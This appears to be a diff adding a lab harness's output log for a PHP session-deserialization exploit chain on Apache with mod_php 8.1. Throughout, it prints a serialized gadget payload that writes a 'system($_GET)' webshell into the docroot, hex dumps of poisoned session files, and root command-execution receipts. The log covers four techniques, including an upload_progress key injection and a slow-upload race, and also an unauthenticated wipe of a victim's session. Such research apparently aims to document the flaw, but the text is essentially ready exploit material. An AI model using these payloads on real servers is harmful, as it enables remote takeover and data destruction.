@@ -1,0 +1,79 @@
+[lab] P_UPWR=inj|O:14:"DeferredWriter":2:{s:4:"path";s:29:"/tmp/p2s_ap/html/up_shell.php";s:4:"data";s:28:"<?php system($_GET['c']); ?>";}
+==================================================================
+ lab: Apache prefork + /usr/lib/apache2/modules/libphp8.1.so
+[PASS] lab up: OK 8.1.2-1ubuntu2.27 apache2handler
+[..]   T1: ini_set(php_serialize) write route -> default php read route
+--- session file after write route ---
+00000000  61 3a 31 3a 7b 73 3a 35  3a 22 70 72 65 66 73 22  |a:1:{s:5:"prefs"|
+00000010  3b 73 3a 31 32 38 3a 22  69 6e 6a 7c 4f 3a 31 34  |;s:128:"inj|O:14|
+00000020  3a 22 44 65 66 65 72 72  65 64 57 72 69 74 65 72  |:"DeferredWriter|
+00000030  22 3a 32 3a 7b 73 3a 34  3a 22 70 61 74 68 22 3b  |":2:{s:4:"path";|
+00000040  73 3a 33 32 3a 22 2f 74  6d 70 2f 70 32 73 5f 61  |s:32:"/tmp/p2s_a|
+00000050  70 2f 68 74 6d 6c 2f 70  72 65 66 73 5f 73 68 65  |p/html/prefs_she|
+--- read route (default php handler) ---
+[read.php] handler=php PHP 8.1.2-1ubuntu2.27 apache2handler
+[read.php] done
+[..]   decode failed (expected on php_serialize-written files) -> session destroyed -> gadget destructors fired during teardown
+[PASS] T1: DeferredWriter::__destruct fired, prefs_shell.php written into docroot
+<?php system($_GET['c']); ?> <- webshell content
+[T1 RCE receipt] prefs_shell.php?c=id;uname%20-r;hostname -> uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin
+[PASS] T1 RCE: command executed via webshell (uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin)
+[..]   T2: upload_progress KEY injection; POST dir php_serialize, read php; app stores NOTHING
+STATUS: HTTP/1.1 200 OK
+--- session file after multipart POST ---
+00000000  61 3a 31 3a 7b 73 3a 31  34 31 3a 22 75 70 6c 6f  |a:1:{s:141:"uplo|
+00000010  61 64 5f 70 72 6f 67 72  65 73 73 5f 69 6e 6a 7c  |ad_progress_inj||
+00000020  4f 3a 31 34 3a 22 44 65  66 65 72 72 65 64 57 72  |O:14:"DeferredWr|
+00000030  69 74 65 72 22 3a 32 3a  7b 73 3a 34 3a 22 70 61  |iter":2:{s:4:"pa|
+00000040  74 68 22 3b 73 3a 32 39  3a 22 2f 74 6d 70 2f 70  |th";s:29:"/tmp/p|
+00000050  32 73 5f 61 70 2f 68 74  6d 6c 2f 75 70 5f 73 68  |2s_ap/html/up_sh|
+00000060  65 6c 6c 2e 70 68 70 22  3b 73 3a 34 3a 22 64 61  |ell.php";s:4:"da|
+00000070  74 61 22 3b 73 3a 32 38  3a 22 3c 3f 70 68 70 20  |ta";s:28:"<?php |
+[read.php] handler=php PHP 8.1.2-1ubuntu2.27 apache2handler
+[read.php] done
+[PASS] T2: key-injection object -> DeferredWriter destruct -> up_shell.php in docroot
+[T2 RCE receipt] -> uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin
+[PASS] T2 RCE: command executed via webshell (uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin)
+[..]   T3: stock cleanup=1/strict=1/min_freq=1: slow upload + concurrent readers
+httpd (pid 1198729?) not running
+[prefs.php] stored theme, handler=php_serialize
+[T3] victim session id: rg3dtvdjjvp3a0rsfv4a7364hp
+[T3] session before attack (php_serialize format): a:1:{s:5:"prefs";s:11:"legit-light";}
+[T3] read attempts until shell appeared: 1 | slow client: SLOW upload finished
+[T3] session file after race: a:0:{}
+[T3 RCE receipt] -> uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin
+[PASS] T3 RCE: ALL-STOCK session ini (cleanup=1, strict=1), slow-upload race technique (uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin)
+[..]   T4: default php write handler: invalid-key rejection + victim session wipe
+--- victim session before poison ---
+pref|s:6:"keepme";
+STATUS: HTTP/1.1 200 OK
+--- victim session after poison (size=0) ---
+--- error.log session lines ---
+[FAIL] T4: no invalid-key warning
+[PASS] T4: victim session data WIPED (truncated to 0) - unauth session-wipe
+[..]   T6/B2: save_path inside docroot + SetHandler -> session file IS a webshell
+httpd (pid 1198806?) not running
+--- docroot session file content ---
+a:1:{s:5:"prefs";s:44:"<?php system($_GET['c']); __halt_compiler();";}
+[B2 RCE receipt] /s/sess_t5sid000000000000000000000000?c=... -> a:1:{s:5:"prefs";s:44:"uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin
+[PASS] B2 RCE: session-file webshell executed (a:1:{s:5:"prefs";s:44:"uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+Rasputin)
+httpd (pid 1198828?) not running
+==================================================================
+ RESULT: 8 passed, 1 failed | lab artifacts: /tmp/p2s_ap
+==================================================================
